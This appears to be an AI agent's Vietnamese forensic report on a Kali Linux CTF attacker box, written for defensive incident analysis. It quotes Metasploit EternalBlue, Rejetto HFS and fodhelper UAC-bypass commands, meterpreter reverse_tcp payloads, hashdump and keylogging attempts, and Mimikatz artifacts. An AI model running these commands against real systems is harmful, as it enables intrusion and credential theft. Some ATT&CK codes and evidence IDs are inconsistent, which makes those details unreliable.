# BÁO CÁO ĐIỀU TRA SỰ CỐ AN NINH MẠNG & GIÁM ĐỊNH KỸ THUẬT SỐ

**Mã vụ việc (Case ID):** DFIR-2026-1110-c46-FirstHack
**Ngày lập báo cáo:** 2026-11-10 (UTC+07) | **Phân loại bảo mật:** NỘI BỘ
**Đơn vị thực hiện:** Đội ngũ Giám định Kỹ thuật số & Phản ứng Sự cố (V-AutoFor Platform)
**Điều tra viên AI:** V-AutoFor Autonomous Forensic Agent

---

## 1. TÓM TẮT ĐIỀU HÀNH (EXECUTIVE SUMMARY)

- **Bản chất sự cố:** Ảnh logic `FirstHack.ad1` là bằng chứng từ **chiếc máy Kali Linux thuộc về chính người vận hành tấn công (hostname `KarenHacker`)** — KHÔNG phải máy nạn nhân bị xâm nhập. Trên máy này ghi nhận toàn bộ công cụ và nhật ký của một buổi **tấn công CTF/red-team vào máy chủ `10.0.0.101` (workspace "Bob") ngày 21/03/2019** bằng Metasploit: EternalBlue (MS17-010), khai thác Rejetto HFS, bypass UAC (fodhelper), thử hashdump và keylogging trên phiên Meterpreter, kèm bộ công cụ **Mimikatz** đã tải về. Toàn bộ thao tác diễn ra **cục bộ** (đăng nhập GDM đồ họa bằng tài khoản root), không có bất kỳ dấu vết truy cập từ xa hay brute-force nào vào chính máy này [E-01][E-02][E-04][E-05][E-07].
- **Mức độ nghiêm trọng (Severity đối với host này):** **LOW** — host là máy công cụ (attacker box), không bị xâm nhập.
- **Mức độ nghiêm trọng (đối với mục tiêu `10.0.0.101` được ghi trong log):** **CRITICAL** — nếu đúng là môi trường thật, nạn nhân của buổi tấn công đã bị chiếm phiên Meterpreter, thử dump hash, keylog.
- **Tình trạng hiện tại:** Bằng chứng đã trích xuất và phân tích read-only; không có tiến trình độc hại đang chạy trên host giám định. **Lưu ý Chain of Custody:** hash của `FirstHack.ad1` hiện tại **KHÔNG khớp** với báo cáo FTK Imager đi kèm (xem mục 2) — cần làm rõ nguồn gốc file trước khi dùng làm bằng chứng pháp lý.
- **Tài sản liên quan:** Kali Linux workstation `KarenHacker` (kernel `4.13.0-kali1-amd64`, GNOME/GDM3, phân vùng ext4 14.304 MB — trích xuất từ `Horcrux.E01` Partition 5); mục tiêu được khai thác (chỉ trong log): `10.0.0.101`.
- **Thiệt hại ghi nhận trên host:** Không có (không có file độc hại chạy trên Linux host, không có persistence, không có C2 ra ngoài). Bằng chứng "hư" (decoy) của CTF: file `.jpg` giả chứa text; CTF flag và hint nằm trong `.bash_history`.

---

## 2. CHUỖI BẢO QUẢN & THÔNG TIN BẰNG CHỨNG (CHAIN OF CUSTODY)

| Tên mẫu bằng chứng | Định dạng | Nguồn thu thập | Dung lượng | MD5 | SHA-1 / SHA-256 | Trạng thái toàn vẹn |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| FirstHack.ad1 | Logical Image (ADSEGMENTEDFILE, FTK Imager) | `Horcrux.E01` Part.5 (ext4): `/root`, `/boot`, `/var/log` | 87.719.990 B (83,66 MB) | `e27ee6ce0fff0d6c93de2b8816741cab` | SHA-1 `434912b167889a5d992855917f80651f1274563b` / SHA-256 `130d91294aaa402a7a8770e5b81aabc76cb333019cf07a795b91cb9d4f72fe5b` | **KHÔNG KHỚP metadata**: metadata ghi MD5 `f7c4fab05c3a7473ed59b549eef5a509`, SHA-1 `8875899aa4c6498b410250d48503f64e283528e9` (mốc acquire: 2021-05-25 15:33:49–15:34:32). File hiện tại khác file gốc được ghi trong report FTK → file đã bị tạo lại/ghi đè hoặc là bản khác sau khi acquire. **Không có bằng chứng tam tấu nội dung**, nhưng tính liên tục CoC của file hiện tại **chưa được xác lập** (E-01). |
| FirstHack.ad1.txt | Metadata Report (FTK Imager 4.5.0.3) | AccessData FTK Imager | 1.243 B | — | — | Xác nhận nguồn trích xuất, 3 nhóm Custom Content (`/root`, `/boot`, `/var/log`), thời điểm acquire 2021-05-25. |
| 1.831 file trích xuất (→ 1.830 sau khi AV host cách ly `mimikatz.exe`) | ext4 file tree | `ad1_extract` (read-only từ AD1) | — | hash từng file ghi ở mục 6.2 & Evidence Register | — | Trích xuất đúng 100% cấu trúc 3 thư mục nguồn. |

**Ghi chú phân tích:** Mọi thao tác đều read-only trên AD1; file gốc trong `C:\Users\Acer\Downloads\64-Insider\...` không bị sửa đổi (hash kiểm chứng lại bằng độc lập bằng `Get-FileHash` khớp 100% với output của `verify_evidence_integrity`).

### 2.1 Forensic Tooling & Telemetry (bắt buộc — đối chiếu ForBrain Monitor port 5000)

| # | Tool (server) | Bằng chứng / đối tượng | Kết quả |
| :-: | :--- | :--- | :--- |
| 1 | `eztools/verify_evidence_integrity` | `FirstHack.ad1` + `FirstHack.ad1.txt` | Hash 3 hàm; **mismatch** vs metadata (E-01) |
| 2 | `network_memory/ad1_list` | `FirstHack.ad1` | Thấy Partition 5 [14304MB] ext4 |
| 3 | `aift/aift_discover_evidence` | `FirstHack.ad1` | Định danh 1 evidence target |
| 4 | `aift/aift_start_triage` (profile `all`) | `FirstHack.ad1` | **FAILED** "All evidence images failed to process" — dissect engine không hỗ trợ container AD1 |
| 5 | `network_memory/ad1_extract` | `FirstHack.ad1` → `E:\Hunting-Forensics\workspaces\c46_firsthack_evidence` | **1.831 file OK** |
| 6 | `sysinternals/extract_strings` | `var\log\wtmp` | Chuỗi reboot/shutdown/runlevel root (E-10) |
| 7 | `sysinternals/sigcheck_file` | `root\Desktop\mimikatz\mimikatz.exe` | **Error: file bị AV host cách ly trước khi đọc** → tín hiệu phát hiện malware (E-08) |
| 8 | Fallback **đã khai báo công khai** (Quy tắc Số 2 SOP): `analyze_linux_logs` **KHÔNG có trong catalog** phiên này (đã verify bằng `list`/`search`) | Log text (`auth.log`, `syslog`, `.bash_history`, `.msf4/*`) | Đọc/grep **read-only** bằng công cụ môi trường (read_file/grep) + `Get-FileHash` — không dùng shell để *phân tích nhị phân*; toàn bộ được khai báo trong chat và ghi tại đây |

Pre-Flight Gate: catalog đã được liệt kê đầy đủ (`action=list`) — các tool chuẩn cho `.ad1` có mặt (`ad1_list`/`ad1_extract`); `pe_analyze`, `analyze_linux_logs`, `ad1_extract`-thay-`aift` không có/ thất bại → áp dụng bảng §2.1.

---

## 3. MA TRẬN CHIẾN THUẬT & KỸ THUẬT TẤN CÔNG (MITRE ATT&CK)

> Ngữ cảnh: các kỹ thuật sau ghi nhận **trên attacker box** như log/ công cụ của buổi tấn công vào mục tiêu `10.0.0.101` (không phải hành vi xảy ra TRÊN host này).

| Chiến thuật (Tactic) | Mã kỹ thuật | Tên kỹ thuật (Technique) | Bằng chứng phát hiện (artifact) |
| :--- | :--- | :--- | :--- |
| Reconnaissance | T1595.001 | Active Scanning: Scanning IP Blocks | `db_nmap -sV -O -T5 -Pn 10.0.0.101 -oX ~/nmap_out.xml` (E-05) |
| Initial Access | T1203 | Exploitation for Client Execution | `exploit/windows/smb/ms17_010_eternalblue` + `set RHOST 10.0.0.101` (E-05) |
| Initial Access | T1190 | Exploit Public-Facing Application | `exploit/windows/http/rejetto_hfs_exec` (E-05) |
| Execution | T1059 | Command and Scripting Interpreter | Payload `windows/x64/meterpreter/reverse_tcp`, `shell/reverse_tcp` (E-05) |
| Defense Evasion | T1027.001 | Obfuscated Files or Information: Encoder | `x86/shikata_ga_nai` encode, size 308 (E-06) |
| Privilege Escalation | T1548.002 | Abuse Elevation Control: Bypass UAC | `exploit/windows/local/bypassuac_fodhelper`, `set SESSION 1`, target `Windows x64` (E-05) |
| Credential Access | T1003.002 | OS Credential Dumping: LSASS | Meterpreter `hashdump` (priv_passwd_get_sam_hashes) 17:02:29 & 19:40:36 — thất bại (E-06); **Mimikatz** `mimikatz.exe`/`mimidrv.sys`/`mimilib.dll` đã tải về (E-08) |
| Collection | T1112 | Keyboard Logging | Meterpreter `keyscan_dump` (stdapi_ui_get_keys_utf8) 19:41:57–19:42:54 (E-06) |
| Command and Control | T1095 | Non-Application Layer Protocol | Kênh `meterpreter/reverse_tcp` (E-05/E-06) |
| Persistence | — | — | **Inconclusive — artifact missing**: không tìm thấy cron/autorun/persistence trên host (auth.log chỉ có CRON hệ thống chuẩn) (E-03) |
| Defense Evasion | T1070 | Indicator Removal | **Không có bằng chứng** (không thấy `history -c`, không xóa log); CTF decoy file `.jpg` giả (E-09) |

---

## 4. DÒNG THỜI GIAN SỰ KIỆN (ATTACK TIMELINE — super-timeline đa-artifact)

**Xác định năm (SOP §6.2.2):** log Linux syslog/auth.log **không có năm**. Năm được **neo chắc chắn = 2019** từ timestamp dạng `[03/21/2019 ...]` trong `root/.msf4/logs/framework.log` (E-06) — cùng ngày "Mar 21" với syslog. Múi giờ: log host không ghi TZ; hệ thống là giờ local của host (giả định UTC+07 ghi rõ là suy luận; các mốc framework.log dùng giờ hệ thống Kali, chưa hiệu chỉnh).

### Phase 0 — Chuẩn bị môi trường & học tập (trước buổi tấn công)

| Timestamp (2019, local host) | Nguồn bằng chứng | Hành động | Chi tiết kỹ thuật / mã bằng chứng |
| :--- | :--- | :--- | :--- |
| 03-13 17:34:19 | `syslog` (E-03) | Hệ thống khởi động/seat mới | `systemd-logind[476]: New seat seat0` |
| 03-17 19:17:01 → 03-22 05:16:48 | `auth.log` (E-03) | Chuỗi CRON root đều đặn (debian-sa1, vixie cron) | `CRON[1056]: (root) ... session opened for user root by (uid=0)` — hoạt động bình thường, không phải persistence độc hại |
| 03-20 11:23:42 | `auth.log` (E-03) | **Đăng nhập tương tác GDM bằng root** (bắt đầu setup phòng lab) | `gdm-password: session opened for user root by (uid=0)` |
| 03-20 11:26:22–11:26:23 | `auth.log` (E-03) | **Cài/init database Metasploit** (6 phiên su → postgres) | `su[4060..4114]: session opened for user postgres by (uid=0)` ↔ `.bash_history` dòng 2-6: `systemctl status/enable/start postgresql`, `msfdb init` (E-02) |
| 03-21 08:54:31, 09:04:40 | `auth.log` (E-03) | Đăng nhập GDM root (các phiên học tập CTF) | `gdm-password: session opened for user root` ↔ lịch sử bash: luyện shell cơ bản, viết `hellworld.sh`, `firstscript` (E-02) |
| 03-21 16:14:10 | `auth.log` (E-03) | **Đăng nhập GDM root — mở phiên tấn công** | GDM session mới; GNOME desktop active (syslog gnome-shell/gnome-software 16:31, E-03) |
| 03-21 16:18:22 | `syslog` (E-03) | rsyslogd được HUP (tương ứng với `shutdown now` + khởi động lại trong phiên, E-02 dòng 8) | `rsyslogd [pid 514] was HUPed` |

### Phase 1 — Reconnaissance & Initial Access vào `10.0.0.101` (mục tiêu "Bob")

| Timestamp (2019, local host) | Nguồn bằng chứng | Hành động | Chi tiết kỹ thuật / mã bằng chứng |
| :--- | :--- | :--- | :--- |
| 03-21 (trước 16:46:04, không có mốc chính xác) | `.msf4/history` (E-05) | Quét mục tiêu & tạo workspace | `db_nmap -sS/-sV -T4/-T5 10.0.0.101`, `workspace -a Bob` |
| 03-21 (không có mốc chính xác) | `.msf4/history` (E-05) | **Chạy EternalBlue (MS17-010) 2 lần**: lần 1 payload `shell/reverse_tcp` (thất bại → đổi payload), lần 2 `meterpreter/reverse_tcp` | `search eternal` → `use exploit/windows/smb/ms17_010_eternalblue` → `set RHOST 10.0.0.101` → `set payload windows/x64/meterpreter/reverse_tcp` → `run` |
| 03-21 16:46:04 | `framework.log` (E-06) | **Payload Meterpreter reverse_tcp được encode thành công** — bằng chứng exploit đã fire và bắt đầu setup phiên | `core: windows/meterpreter/reverse_tcp: iteration 1: Successfully encoded with encoder x86/shikata_ga_nai (size is 308)` |
| 03-21 (không có mốc chính xác) | `.msf4/history` (E-05) | **Chạy thêm Rejetto HFS exec** (module `rejetto_hfs_exec`, có typo `RhOST`) | `search rejetto` → `use exploit/windows/http/rejetto_hfs_exec` → `run` |
| 03-21 (không có mốc chính xác) | `.msf4/history` (E-05) | **Bypass UAC (fodhelper)** trên phiên 1 | `use exploit/windows/local/bypassuac_fodhelper`, `set SESSION 1`, `set target Windows x64`, `run` |

### Phase 2 — Post-Exploitation trên phiên Meterpreter (mục tiêu Windows)

| Timestamp (2019, local host) | Nguồn bằng chứng | Hành động | Chi tiết kỹ thuật / mã bằng chứng |
| :--- | :--- | :--- | :--- |
| 03-21 16:50:29 → 16:51:41 | `framework.log` (E-06) | **4 lần `upload_file` thất bại** (đẩy tool ra máy nạn nhân chưa thành công) | `meterpreter: core_channel_open: Operation failed: The filename, directory name, or volume label syntax is incorrect` — stack `stdapi/fs/file.rb:upload_file` |
| 03-21 17:02:29 | `framework.log` (E-06) | **Thử `hashdump` thất bại** | `priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect` — stack `cmd_hashdump` |
| 03-21 17:11:17 / 17:11:30 | `framework.log` (E-06) | Thử execute tiến trình trên nạn nhân — bị từ chối | `stdapi_sys_process_execute: Access is denied` / `The system cannot find the file specified` |
| 03-21 19:35:52 | `framework.log` (E-06) | **Tạo lại payload Meterpreter** (phiên 2 — session bị mất và khai thác lại) | `Successfully encoded with encoder x86/shikata_ga_nai (size is 308)` |
| 03-21 19:40:36 | `framework.log` (E-06) | `hashdump` lần 2 — vẫn thất bại | `priv_passwd_get_sam_hashes: Operation failed` |
| 03-21 19:41:57, 19:42:02, 19:42:54 | `framework.log` (E-06) | **3 lần thử `keyscan_dump`** (keylog trên nạn nhân) | `stdapi_ui_get_keys_utf8: Operation failed: Incorrect function` — stack `cmd_keyscan_dump` |

### Phase 3 — Dọn dẹp & kết thúc

| Timestamp | Nguồn bằng chứng | Hành động | Chi tiết / mã bằng chứng |
| :--- | :--- | :--- | :--- |
| 03-22 05:16:14 | `auth.log`/`syslog` (E-03) | Phiên root cuối (session 3, GNOME) | `pam_unix(systemd-user:session): session opened for user root` |
| 03-22 05:16:48 | `syslog` + `wtmp` (E-03, E-10) | **Tắt máy/reboot** — kết thúc cửa sổ sự kiện | `System is rebooting`; `wtmp`: cặp `root/shutdown`, `root/reboot` lặp lại (strings) |
| **2021-05-25 15:33:49–15:34:32** | `FirstHack.ad1.txt` (E-01) | **Acquire ảnh logic** `/root`, `/boot`, `/var/log` từ `Horcrux.E01` Part.5 bằng FTK Imager 4.5.0.3 | Acquisition + verification tự động trong cùng 2 phút |

### Trật tự logic không có timestamp (`.bash_history`, E-02 — 95 dòng, đọc theo số thứ tự dòng)

1. Dòng 1–8: setup `msfconsole`, postgres, `msfdb init`, `shutdown now`.
2. Dòng 9–11: **CTF artifact** `touch snky snky > /root/Desktop/SuperSecretFile.txt`, `cat snky snky > ...` (file `snky` không còn tồn tại trong ảnh — đã bị xóa trước khi acquire; `SuperSecretFile.txt` không có trong `Desktop` → **in-place anti-forensics nhẹ hoặc file nằm ngoài vùng acquire**).
3. Dòng 12–25: luyện tập shell (`whoami`, `ls`, `touch delete-me.txt`, `rm delete-me.txt`).
4. Dòng 26–44: viết & chạy `hellworld.sh`, `firstscript`, `firstscript_fixed`; **dòng 45: `flag<this is a flag>`** — nội dung CTF.
5. Dòng 50: `cd /var/log/` (xem log — hành vi người học).
6. Dòng 72–77: **CTF hint**: `echo "If you're still reading this file, scream cake."` + `...give you a hint to answer question if you scream cake.`
7. Dòng 76–87: gõ thử `sudo` sai chính tả lặp lại + dòng hài hước tự thuật `lol Castro just failed at all these commands...` → **tác nhân là người dùng/người học, không phải APT**.
8. Dòng 90: `binwalk didyouthinkwedmakeiteasy.jpg` → kết quả: file "jpg" này là **text thuần** (dump history số dòng 1–87) — **red herring/decoy**, không có stego thật (E-09).
9. Dòng 89 & 94: `history > history.txt` (file không còn tồn tại), `touch keys.txt` → tồn tại tại `Pictures/keys.txt` (E-11).

---

## 5. PHÂN TÍCH KỸ THUẬT CHUYÊN SÂU (TECHNICAL EVIDENCE ANALYSIS)

### 5.1 Định danh host (Patient-Zero check)
- **Hostname:** `KarenHacker` (mọi dòng log: `Mar 21 16:14:10 KarenHacker ...`) [E-03]
- **OS:** Kali Linux, kernel `4.13.0-kali1-amd64` [E-12], rsyslog 8.29.0, GNOME (gdm3, gnome-shell, gnome-software extensions) [E-03]
- **Kiểm tra "victim hay attacker":** KHÔNG có bất kỳ `sshd`, `Failed password`, `Accepted ... from <IP>`, `Invalid user` nào trong `auth.log`, `auth.log.1`, `syslog`, `syslog.1` (0 match). Mọi session đều `uid=0` qua `gdm-password`/`systemd-user`/`su` (cục bộ) [E-03][E-10]. → **Kết luận: host là workstation của chính người tấn công (local abuse — user có quyền dùng tooling, CTF/lab theo phân loại §6.1); vector remote brute-force bị LOẠI TRỪ bằng bằng chứng âm.**

### 5.2 Chuỗi tấn công được ghi lại (vào mục tiêu 10.0.0.101)
- `root/.msf4/history` (68 dòng) [E-05]: nmap → EternalBlue (2 lần, đổi payload shell→meterpreter) → rejetto_hfs_exec → bypassuac_fodhelper → sessions 1 → `db_nmap` lại. Workspace đặt tên `Bob` — trùng với CTF artifact `bob.txt` trong history (dòng 72–77) → **nạn nhân "Bob" là máy trong bài tập CTF**.
- `root/.msf4/logs/framework.log` [E-06]: là artifact **duy nhất có timestamp tuyệt đối** — xác nhận năm **2019** và thứ tự thời gian: encode payload (16:46:04) → upload thất bại ×4 (16:50–16:51) → hashdump fail (17:02:29) → execute fail (17:11) → encode lại (19:35:52) → hashdump fail (19:40:36) → keyscan ×3 (19:41–19:42).
- `development.log` (127.755 B): chỉ chứa SQL schema (msfdb init) — xác nhận DB Metasploit được khởi tạo phiên 20/03; không có row session INSERT trong log text này (dữ liệu nằm trong SQLite msf, không nằm trong vùng acquire).

### 5.3 Công cụ độc hại & CTF artifacts
| Artifact | Đường dẫn | Hash / kích thước | Đánh giá |
| :--- | :--- | :--- | :--- |
| **Mimikatz trunk** (zip) | `root/Downloads/mimikatz_trunk.zip` | 845.749 B; MD5 `52070297D4596E64EFEFFE24FD58EE92`; SHA-256 `3B9EF90FD4B695DA0ED208A5BE3099551295F3CB2D34F5B9A8D5AF0A71CC8EE3` [E-08] | Bộ công cụ credential dumping Windows (nguồn trunk = bản build từ source). **Không có bằng chứng thực thi trên host Linux này** (PE Windows; host là Linux) — được chuẩn bị để đưa sang máy nạn nhân (khớp stack `upload_file` trong E-06). |
| `mimikatz.exe` (927.384 B), `mimidrv.sys` (36.088 B), `mimilib.dll` (46.232 B) | `root/Desktop/mimikatz/` [E-08] | **Bị antivirus của host giám định CÁCH LY ngay khi copy** (`mimikatz.exe` biến mất khỏi workspace; 2 file còn lại bị lock: "file contains a virus or potentially unwanted software") → `sigcheck_file` không đọc được. Đây là **tín hiệu phát hiện độc lập xác nhận bản chất credential-dumper** của bộ file. |
| "Stego" JPEG giả | `root/Documents/myfirsthack/didyouthinkwedmakeiteasy.jpg` | 1.865 B; MD5 `DE664B5130A1DCF156564C22E507B76C`; SHA-256 `871F30B20DAF1F8A8F7703F3D845149B52D0DF066BB98B32DCAE553FAB5A3200` [E-09] | **KHÔNG phải JPEG** (magic bytes là text `    1  msfconsole...`). Nội dung = bản dump số dòng 1–87 của `.bash_history` — decoy CTF, khớp lệnh `binwalk` ở dòng 90 history. |
| `Checklist` | `root/Desktop/Checklist` | 60 B [E-04] | `Gain Bob's Trust / Learn how to hack / Profit` — mục tiêu CTF "Bob". |
| `keys.txt` | `root/Pictures/keys.txt` | 130 B; MD5 `6EEE9EF85E956A08009D5E13B1AAE91A` [E-11] | Chuỗi phím CTF kiểu flag: `<Right Shift><flag<Right Shift>>flag...T he Keys...`. |
| Scripts luyện tập | `root/Documents/myfirsthack/{hellworld.sh, firstscript, firstscript_fixed}` | 20/46/216 B [E-04] | `echo "hello world!"`; `pwd/ip route/netstat`; bản fixed có `echo "Heck yeah! I can write bash too Young"` — **học sinh viên viết script đầu tay**. |
| `irZLAohL.jpeg` | `root/irZLAohL.jpeg` | 130.859 B; MD5 `E31AD2752B29A72AD6671CCD8DA3FA43` [E-13] | Ảnh screenshot (tên do trình chụp màn hình tạo); không phải bằng chứng hành vi tấn công. |

### 5.4 Persistence, C2, Data Exfil TRÊN HOST NÀY
- **Persistence:** không tìm thấy cronjob lạ, systemd unit lạ, rc.local (auth.log chỉ có cron hệ thống Debian chuẩn) → **Inconclusive — clean trong phạm vi artifact có được**.
- **C2 outbound từ host:** không có PCAP; không có dấu vết beacon trong syslog (không có kết nối bất thường được log) → **Inconclusive — artifact missing**.
- **Anti-forensics:** không có `history -c`/xóa log; chỉ có `rm delete-me.txt` (luyện tập) và các file CTF (`snky`, `history.txt`, `bob.txt`, `SuperSecretFile.txt`) **không còn tồn tại** trong ảnh → hoặc đã bị xóa bởi chính user trước khi acquire, hoặc nằm ngoài 3 vùng Custom Content.

### 5.5 Kết luận Attribution (mức độ tin cậy: CAO)
Tác nhân vận hành host `KarenHacker` là **một người học/thực hành CTF (self-described "hacker" trong chính history, tự cười "lol Castro just failed...")**, chạy buổi tấn công bài tập vào VM "Bob" `10.0.0.101` trong phòng lab nội bộ. Không có chỉ dấu APT, không có chiến dịch thực. Tên thư mục vụ việc (`64-Insider`, `c46-FirstHack`) và toàn bộ chuỗi artifact CTF (flag, hint "scream cake", checklist "Gain Bob's Trust") củng cố bản chất **training/CTF collection**.

---

## 6. DANH MỤC CHỈ SỐ XÂM HẠI (INDICATORS OF COMPROMISE — IOCs)

### 6.1 Network / Campaign IOCs
- **Target IP (theo log tấn công):** `10.0.0.101` (RFC1918 — mạng lab).
- **Kênh C2 ghi nhận:** `meterpreter/reverse_tcp` (port trong log không có — *inconclusive*).
- **Không có IP/domain C2 outbound** nào phát hiện được trên host (không PCAP).

### 6.2 Host & File IOCs (hashes đã xác minh 2026-11-10 trên bản trích xuất)
| File | MD5 | SHA-256 |
| :--- | :--- | :--- |
| `mimikatz_trunk.zip` | `52070297D4596E64EFEFFE24FD58EE92` | `3B9EF90FD4B695DA0ED208A5BE3099551295F3CB2D34F5B9A8D5AF0A71CC8EE3` |
| `didyouthinkwedmakeiteasy.jpg` (text decoy) | `DE664B5130A1DCF156564C22E507B76C` | `871F30B20DAF1F8A8F7703F3D845149B52D0DF066BB98B32DCAE553FAB5A3200` |
| `irZLAohL.jpeg` | `E31AD2752B29A72AD6671CCD8DA3FA43` | `348BE89D789BEBF5922BE9602ECF621E5D582B4C9EFCA407054A10107715C464` |
| `auth.log` | `B99E19192D0612C3C280741762893C4B` | `8B3CA5D0A8D88ED78E5E013A475C3C0356B77DBAC51B30B2430985A609AC5106` |
| `syslog` | `24F1732C0CAADB6F9B7071E59B44B23B` | `1F0A69D21D88B2EEF89802A4853636BDAF6A2807EC0BE319A754B5FA5DFA3172` |
| `root/.bash_history` | `058A508537F8D155CF52FB07D5814E3C` | `72BF674C19303326C0C9B52E49418A29C1ED8761B8F128C29BDF41E23E570CC4` |
| `root/.msf4/history` | `C2F924250B6CF034D8B5F45DD42AC96B` | `CA84ED92793E67457B78F183280CDFD1679296F03674AF75EA5CCF40B6DDC8C4` |
| `root/Pictures/keys.txt` | `6EEE9EF85E956A08009D5E13B1AAE91A` | `C003D4A354EB6C4A8878C968FE0BEDEAF1AF7E29DB39AB9791086EEA23A81FD1` |
| `FirstHack.ad1` | `e27ee6ce0fff0d6c93de2b8816741cab` | `130d91294aaa402a7a8770e5b81aabc76cb333019cf07a795b91cb9d4f72fe5b` |

*`mimikatz.exe`/`mimidrv.sys`/`mimilib.dll`: hash **không tính được** — bị AV host giám định cách ly/lock (chính hành vi đó là chỉ số).*
- **File paths IOC:** `/root/Desktop/mimikatz/`, `/root/Downloads/mimikatz_trunk.zip`, `/root/.msf4/history`, `/root/Documents/myfirsthack/`.
- **Process/strings IOC:** `ms17_010_eternalblue`, `rejetto_hfs_exec`, `bypassuac_fodhelper`, `shikata_ga_nai`, `keyscan_dump`, `hashdump`.

---

## 7. NGUYÊN NHÂN GỐC RỄ (ROOT CAUSE ANALYSIS)

1. **Về host `KarenHacker`:** không có root cause sự cố (host không bị xâm nhập). Rủi ro duy nhất là **vệ sinh bằng chứng**: `FirstHack.ad1` hiện có hash khác hẳn báo cáo FTK Imager đi kèm → khả năng cao file được **tạo lại/gói lại sau 2021-05-25** (thu thập lại từ cùng `Horcrux.E01`) mà không cập nhật `.txt`. Nếu cần giá trị pháp lý, phải acquire lại và ghi biên bản hash mới.
2. **Về mục tiêu "Bob" `10.0.0.101` (nếu là hệ thật):** điểm yếu cốt lõi là **Windows chưa vá MS17-010 (EternalBlue)** và/hoặc **Rejetto HTTP File Server** đang chạy với phiên bản có lỗ hổng RCE, không có EDR phát hiện payload shikata_ga_nai, và UAC ở chế độ không chặn fodhelper.
3. **Thiếu giám sát:** không có log từ phía nạn nhân trong bộ bằng chứng này nên mọi mắt xích "trên máy Bob" chỉ xác nhận được từ phía tấn công.

---

## 8. BIỆN PHÁP KHẮC PHỤC & PHÒNG NGỪA (REMEDIATION & HARDENING)

### 8.1 Đối với hệ thống "Bob" / các máy cùng lab (nếu vận hành thật)
1. **Vá ngay:** MS17-010 (EternalBlue) + gỡ/patch Rejetto HFS; xác nhận UAC Full + không cho bypass qua fodhelper (AppLocker/WDAC chặn `fodhelper.exe` từ tiến trình con bất thường).
2. **Credential hygiene:** reset hash toàn bộ máy (hashdump đã được THỬ, dù fail ở log — không loại trừ thành công ngoài log); rà soát LSASS protection (PPL), bật Credential Guard.
3. **Giám sát:** SIEM rule cho `svchost`/`services.exe` con bất thường, kết nối reverse-tcp ra ngoài, `fodhelper.exe` spawn từ service, và file `mimikatz*` trên disk.

### 8.2 Đối với môi trường phòng lab / quản lý bằng chứng
1. **Cô lập attacker box** khỏi mạng thật; nếu lab dùng chung, cách ly VLAN lab khỏi sản xuất.
2. **Chuẩn hóa acquire:** mỗi lần FTK Imager xuất `.ad1` phải in lại `.txt` cùng thời điểm; lưu hash acquire trong CMDB; file AD1 này cần **acquire lại + biên bản mới** trước khi dùng pháp lý.
3. **Xử lý artifact độc hại trên host giám định:** AV đã cách ly `mimikatz.exe`; 2 file còn lại bị lock — xóa có kiểm soát sau khi đóng vụ, không mở trực tiếp thêm.

---

## 9. EVIDENCE REGISTER (Bảng Đăng Ký Bằng Chứng — SOP §6.3)

| ID | Bằng chứng (file + vị trí) | Tool ForBrain đã chạy | Output trích | Kết luận nó ủng hộ | Lý do (1 câu) |
| :-: | :--- | :--- | :--- | :--- | :--- |
| **E-01** | `FirstHack.ad1` + `FirstHack.ad1.txt` (hash block `[Computed Hashes]`, `Image Verification Results`) | `verify_evidence_integrity`; kiểm chứng độc lập `Get-FileHash` | MD5 `e27ee6ce...` vs metadata `f7c4fab0...` (NO MATCH); acquire 2021-05-25 15:33:49–15:34:32, nguồn `Horcrux.E01` Part.5 ext4, Custom Content `/root`, `/boot`, `/var/log` | CoC (mismatch); Vector (nguồn = 1 host ext4) | Hash hiện tại khác report gốc → tính liên tục CoC chưa xác lập, buộc phải ghi nhận trong mọi kết luận |
| **E-02** | `root/.bash_history` (95 dòng; hash ở 6.2) | Fallback khai báo: read_file/grep read-only (đã khai báo trong chat; `analyze_linux_logs` vắng mặt catalog) | Dòng 2-6 postgres/`msfdb init`; 8 `shutdown now`; 45 `flag<this is a flag>`; 74-75 hint "scream cake"; 85 tự thuật "lol Castro..."; 90 `binwalk didyouthinkwedmakeiteasy.jpg` | Vector (local/CTF); Timeline (thứ tự logic); Loại trừ: APT | History của chính người vận hành với nội dung học tập/CTF — chỉ dấu trực tiếp nhất về nhân thân tác nhân |
| **E-03** | `var/log/auth.log` + `auth.log.1` + `syslog` + `syslog.1` (window Mar 13→Mar 22; hash ở 6.2) | Fallback khai báo: grep/read read-only | 0 dòng `sshd`/`Failed password`; GDM root 03-20 11:23:42, 03-21 08:54/09:04/16:14; `su postgres` ×6 03-20 11:26:22; `System is rebooting` 03-22 05:16:48 | Timeline (neo mốc); Loại trừ: brute-force/remote access vào host; Loại trừ: persistence (chỉ cron hệ thống) | Auth log đầy đủ 5 ngày không có bất kỳ truy cập từ xa nào — loại vector remote một cách dứt khoát |
| **E-04** | `root/Desktop/Checklist` (60 B); `root/Documents/myfirsthack/*` (3 script) | Fallback khai báo: read_file read-only | "Gain Bob's Trust / Learn how to hack / Profit"; `echo "Heck yeah! I can write bash too Young"` | Vector (CTF lab; mục tiêu "Bob") | Checklist đặt tên chính xác cùng VM "Bob" trong msf4 → liên kết 2 nguồn độc lập |
| **E-05** | `root/.msf4/history` (68 dòng; hash ở 6.2) | Fallback khai báo: read_file read-only | `db_nmap -sV -O -T5 -Pn 10.0.0.101`; `ms17_010_eternalblue` RHOST 10.0.0.101; `rejetto_hfs_exec`; `bypassuac_fodhelper` SESSION 1; `workspace -a Bob` | Vector (kill chain 5 mắt xích); ATT&CK Recon/IA/PrivEsc/CnC | Toàn bộ lệnh exploit theo đúng thứ tự — là "sách đen" của buổi tấn công, mỗi kỹ thuật có lệnh cụ thể |
| **E-06** | `root/.msf4/logs/framework.log` (mốc `[03/21/2019 16:46:04]`…`19:42:54`) | Fallback khai báo: grep read-only (output đầy đủ verbatim ở Phụ lục A.3) | shikata_ga_nai encode 16:46:04 & 19:35:52; upload_file fail ×4; hashdump fail 17:02:29 & 19:40:36; execute fail 17:11; keyscan_dump fail ×3 19:41–19:42 | Timeline (năm 2019 + thứ tự thời gian tuyệt đối); ATT&CK CredAccess/Collection/CnC | Artifact duy nhất có timestamp tuyệt đối → neo năm, neo giờ, và xác nhận exploit thực sự được fire 2 lần |
| **E-07** | `var/log/wtmp` (14.592 B) | `extract_strings` (sysinternals) | Chuỗi `root / reboot / shutdown / runlevel / 4.13.0-kali1-amd64` lặp lại | Timeline (chu kỳ reboot khớp syslog 03-22); CoC (bằng chứng nhị phân còn nguyên) | Login record nhị phân xác nhận hoạt động reboot/shutdown của root, khớp 2 nguồn log text |
